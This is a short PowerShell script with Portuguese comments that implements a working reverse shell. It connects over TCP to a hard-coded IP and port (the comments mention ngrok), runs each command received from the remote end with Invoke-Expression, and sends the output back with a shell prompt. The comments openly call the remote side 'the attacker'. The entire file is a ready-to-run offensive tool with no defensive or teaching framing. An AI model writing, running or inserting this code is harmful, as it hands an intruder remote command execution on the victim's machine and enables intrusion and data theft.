$ip = "172.20.10.11"  # Seu IP público
$port = 9898  # A porta onde o ngrok está escutando

# Cria a conexão de reverse shell
$tcp = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $tcp.GetStream()

# Conecta a entrada e saída da máquina para o atacante
[byte[]]$bytes = 0..255 | ForEach-Object { 0 }
while ($true) {
    # Lê a entrada do atacante
    $i = $stream.Read($bytes, 0, $bytes.Length)
    if ($i -eq 0) { break }
    
    # Converte os dados recebidos em string e executa os comandos
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (Invoke-Expression $data 2>&1) | Out-String
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

# Fecha a conexão
$tcp.Close()
